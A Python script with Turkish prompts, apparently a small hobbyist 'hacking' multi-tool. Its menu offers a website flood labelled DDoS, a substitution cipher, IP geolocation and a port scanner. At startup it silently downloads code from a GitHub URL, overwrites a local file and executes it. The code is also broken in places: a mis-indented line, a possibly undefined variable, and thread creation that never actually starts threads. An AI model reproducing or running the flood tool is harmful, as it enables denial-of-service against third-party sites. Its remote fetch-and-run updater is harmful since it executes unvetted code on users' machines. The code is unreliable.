from colorama import Fore
import colorama
import os
import pyperclip
import requests
from tqdm import tqdm
import sys, time, random
import threading
import json
import re
import socket
colorama.init()




banner = f"""{Fore.LIGHTYELLOW_EX}

 █████╗ ███╗   ██╗████████╗██╗       ██████╗
██╔══██╗████╗  ██║╚══██╔══╝██║      ██╔════╝
███████║██╔██╗ ██║   ██║   ██║█████╗██║     
██╔══██║██║╚██╗██║   ██║   ██║╚════╝██║     
██║  ██║██║ ╚████║   ██║   ██║      ╚██████╗
╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝       ╚═════╝
                    {Fore.CYAN}[+]Coded By ConeDLL

                    
"""


    



def fast_print(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.01)


def print_slow(str):
    for letter in str:
        sys.stdout.write(letter)
        sys.stdout.flush()
        time.sleep(0.05)

# Güncelleme bayrağı
update_done = False

version_link = 'https://raw.githubusercontent.com/ConeDll/apipy/main/sonsurum.py'
r = requests.get(version_link)
response_version = r.text.splitlines()  # İndirilen veriyi satır satır ayırın

with open('alfabe.py', 'r', encoding='utf-8') as g:
    veri = g.read()

if response_version != veri.splitlines():
    with open('alfabe.py', 'w', encoding='utf-8') as f:
        f.writelines([line + '\n' for line in response_version])
        f.close()
        print(Fore.MAGENTA)
        
    print(Fore.YELLOW)
    for i in tqdm(range(101), desc='Güncelleniyor', ascii=False, ncols=75):
        time.sleep(0.01)
    print_slow(Fore.GREEN + '\nGüncelleme Tamamlandı')
    print_slow(Fore.CYAN + '\nSistem Yeniden Başlatılıyor...\n')
    os.system('cls')
    os.system('python alfabe.py')



    
    update_done = True

if not update_done:

    print(banner)




    print(Fore.LIGHTMAGENTA_EX)





    



    choose = input('Lütfen İşleminizi Seçin\n1-DDos\n2-Alfabe\n3-IP Location\n4-Port Scanner\nSeçimin: ')
    print(Fore.WHITE)

if choose == "4":
    
    ip_add_pattern = re.compile("^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")

    port_range_pattern = re.compile("([0-9]+)-([0-9]+)")

    port_min = 0
    port_max = 65535

    colorama.init()


    open_ports = []

    while True:
        ip_add_entered = input(f"\n{Fore.LIGHTCYAN_EX}Taratmak İstediğiniz IP Adresinini Yazınız: ")
        if ip_add_pattern.search(ip_add_entered):
            print(f"{ip_add_entered} {Fore.GREEN} Geçerli bir IP Adresi!")
            break

    while True:
        
        print(f"{Fore.YELLOW}Aramak istediğiniz port aralığını giriniz: <int>-<int> (örnek 60-120)")
        port_range = input("Port Aralığı: ")
        port_range_valid = port_range_pattern.search(port_range.replace(" ",""))
        if port_range_valid:
            port_min = int(port_range_valid.group(1))
            port_max = int(port_range_valid.group(2))
            break


    for port in range(port_min, port_max + 1):
        
        try:
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                
                s.settimeout(0.5)
            
                s.connect((ip_add_entered, port))
            
                open_ports.append(port)

        except:
            
            pass


    for port in open_ports:
        
        print(f"Port {Fore.GREEN} {port} is open on {ip_add_entered}.")
     cikis4 = input(f"{Fore.WHITE}Çıkmak için exit yaz: ")

if choose == "3":
    ip = input(f"{Fore.WHITE}\n Enter IP target : {Fore.GREEN}") #INPUT IP ADDRESS
    print()
    print(f' {Fore.LIGHTCYAN_EX}============= {Fore.YELLOW}SHOW INFORMATION IP ADDRESS {Fore.LIGHTCYAN_EX}=============')
    req_api = requests.get(f"http://ipwho.is/{ip}") #API IPWHOIS.IS
    ip_data = json.loads(req_api.text)
    time.sleep(2)
    print(f"{Fore.LIGHTCYAN_EX}\n IP target       :{Fore.YELLOW}", ip)
    print(f"{Fore.LIGHTCYAN_EX} Type IP         :{Fore.YELLOW}", ip_data["type"])
    print(f"{Fore.LIGHTCYAN_EX} Country         :{Fore.YELLOW}", ip_data["country"])
    print(f"{Fore.LIGHTCYAN_EX} Country Code    :{Fore.YELLOW}", ip_data["country_code"])
    print(f"{Fore.LIGHTCYAN_EX} City            :{Fore.YELLOW}", ip_data["city"])
    print(f"{Fore.LIGHTCYAN_EX} Continent       :{Fore.YELLOW}", ip_data["continent"])
    print(f"{Fore.LIGHTCYAN_EX} Continent Code  :{Fore.YELLOW}", ip_data["continent_code"])
    print(f"{Fore.LIGHTCYAN_EX} Region          :{Fore.YELLOW}", ip_data["region"])
    print(f"{Fore.LIGHTCYAN_EX} Region Code     :{Fore.YELLOW}", ip_data["region_code"])
    print(f"{Fore.LIGHTCYAN_EX} Latitude        :{Fore.YELLOW}", ip_data["latitude"])
    print(f"{Fore.LIGHTCYAN_EX} Longitude       :{Fore.YELLOW}", ip_data["longitude"])
    lat = int(ip_data['latitude'])
    lon = int(ip_data['longitude'])
    print(f"{Fore.LIGHTCYAN_EX} Maps            :{Fore.YELLOW}",f"https://www.google.com/maps/@{lat},{lon},8z")
    print(f"{Fore.LIGHTCYAN_EX} EU              :{Fore.YELLOW}", ip_data["is_eu"])
    print(f"{Fore.LIGHTCYAN_EX} Postal          :{Fore.YELLOW}", ip_data["postal"])
    print(f"{Fore.LIGHTCYAN_EX} Calling Code    :{Fore.YELLOW}", ip_data["calling_code"])
    print(f"{Fore.LIGHTCYAN_EX} Capital         :{Fore.YELLOW}", ip_data["capital"])
    print(f"{Fore.LIGHTCYAN_EX} Borders         :{Fore.YELLOW}", ip_data["borders"])
    print(f"{Fore.LIGHTCYAN_EX} Country Flag    :{Fore.YELLOW}", ip_data["flag"]["emoji"])
    print(f"{Fore.LIGHTCYAN_EX} ASN             :{Fore.YELLOW}", ip_data["connection"]["asn"])
    print(f"{Fore.LIGHTCYAN_EX} ORG             :{Fore.YELLOW}", ip_data["connection"]["org"])
    print(f"{Fore.LIGHTCYAN_EX} ISP             :{Fore.YELLOW}", ip_data["connection"]["isp"])
    print(f"{Fore.LIGHTCYAN_EX} Domain          :{Fore.YELLOW}", ip_data["connection"]["domain"])
    print(f"{Fore.LIGHTCYAN_EX} ID              :{Fore.YELLOW}", ip_data["timezone"]["id"])
    print(f"{Fore.LIGHTCYAN_EX} ABBR            :{Fore.YELLOW}", ip_data["timezone"]["abbr"])
    print(f"{Fore.LIGHTCYAN_EX} DST             :{Fore.YELLOW}", ip_data["timezone"]["is_dst"])
    print(f"{Fore.LIGHTCYAN_EX} Offset          :{Fore.YELLOW}", ip_data["timezone"]["offset"])
    print(f"{Fore.LIGHTCYAN_EX} UTC             :{Fore.YELLOW}", ip_data["timezone"]["utc"])
    print(f"{Fore.LIGHTCYAN_EX} Current Time    :{Fore.YELLOW}", ip_data["timezone"]["current_time"])
    cikis = input(F"\n\n{Fore.GREEN}Çıkmak için exit yazınız: ")
    if cikis == "exit":
        exit()

if choose == '2':
    
    alfabe = {
        'a': '3K',
        'b': '1Mü',
        'c': 'ZKş',
        'ç': '=Kö',
        'd': 'MM-ç',
        'e': '8ıl',
        'f': '10xg',
        'g': 'mxaf',
        'ğ': '#Lh',
        'h': 'ZjA',
        'ı': 'l@yl',
        'i': 'ay@b',
        'j': 'gnl@',
        'k': 'zn',
        'l': '4k',
        'm': 'z/r',
        'n': '--aq',
        'o': 'xcazo',
        'ö': 'rt',
        'p': 'hll',
        'r': '1vz',
        's': 'xcw',
        'ş': 'kxk',
        't': 'y3QX',
        'u': 'zA==',
        'ü': 'mtaa',
        'v': 'hj8ü',
        'y': 'Ssc',
        'z': 'ekkk',
        '0': 'kma+',
        '1': 'UK--',
        '2': 'XC==',
        '3': 'zxa!',
        '4': 'xs+f-*',
        '5': 'e4mk',
        '6': '19M',
        '7': 'z-1d',
        '8': 'hmloo',
        '9': 'pcv',
        '-': 'w@M_',
        '+': 'DDLL-_',
        '/': ':&',
        '*': 'zxGk8',
        '.': 'UM0k',
        ',': 'zÇş',
        '@': 'zscaS',
        '#': 'eteta',
        '"': 'dsaasd',
        '|': '452',
        '!': 'ccc',
        '<': 'KK)m',
        '>': 'Zxd',
        '=': 'ASD00',
        '(': '3M1500S',
        ')': 'gvt',
        '{': 'NMUER',
        '}': 'zdf',
        '[': 'kmma',
        ']': 'no12',
        'A': 'ULK0',
        'B': 'ZMB#',
        'C': '##SA',
        'Ç': 'MLO=',
        'D': '==-1',
        'E': 'HELB',
        'F': 'KAMF',
        'G': 'KA/f',
        'Ğ': 'ad0M',
        'H': 'KA1D',
        'I': 'dkaB',
        'İ': 'am0KL',
        'J': 'MKDS',
        'K': 'aMk#',
        'L': 'L4D',
        'M': '&EA',
        'N': 'ZZSq',
        'O': 'xcPzo',
        'Ö': 'XASD',
        'P': 'DSDl',
        'R': 'DAB',
        'S': 'KAVQ',
        'Ş': 'MLKO',
        'T': '809VB',
        'U': '0BD',
        'Ü': 'BKDA#',
        'V': 'basd0*',
        'Y': 'dda',
        'Z': 'gf*-',
        " ": "xac",
    }

    def sifrele(mesaj, alfabe):
        sifreli_mesaj = ''
        for harf in mesaj:
            if harf in alfabe:
                sifreli_mesaj += alfabe[harf]
            else:
                sifreli_mesaj += harf
        return sifreli_mesaj

    def coz(mesaj, alfabe):
        orijinal_mesaj = ''
        i = 0
        while i < len(mesaj):
            found = False
            for harf, kod in alfabe.items():
                if mesaj[i:i + len(kod)] == kod:
                    orijinal_mesaj += harf
                    i += len(kod)
                    found = True
                    break
            if not found:
                orijinal_mesaj += mesaj[i]
                i += 1
        return orijinal_mesaj

    while True:
        secim = input(f"{Fore.YELLOW}Ne yapmak istersiniz?{Fore.WHITE}\n\n\n\n1- Metni kodla\n2 - Metni çöz\n3 - Temizle\n4 - Çıkış\nSeçiminiz: ")

        if secim == '1':
            mesaj = input("Metni girin: ")
            sifreli_metin = sifrele(mesaj, alfabe)
            print("Şifrelenmiş Metin:", Fore.LIGHTCYAN_EX + sifreli_metin + Fore.WHITE)
            pyperclip.copy(sifreli_metin)
        elif secim == '2':
            mesaj = input("Şifrelenmiş metni girin: ")
            orijinal_metin = coz(mesaj, alfabe)
            print("Orijinal Metin:"+ Fore.LIGHTCYAN_EX + orijinal_metin+ Fore.WHITE)
        elif secim == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
        elif secim == '4':
            exit()
        else:
            print("Geçersiz seçenek!")


if choose == '1':
    
    site = input(Fore.LIGHTYELLOW_EX+'Hedef Siteyi Giriniz (Örnek: https://hedefsite.com): '+Fore.WHITE)
    def atak():
        try:
            while True:

                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                requests.get(site)
                
                print(Fore.GREEN+'200')
        except:
            print(Fore.RED+'Bir Hata oluştu'+Fore.WHITE)

    for i in range(40):
        threading.Thread(target=atak())
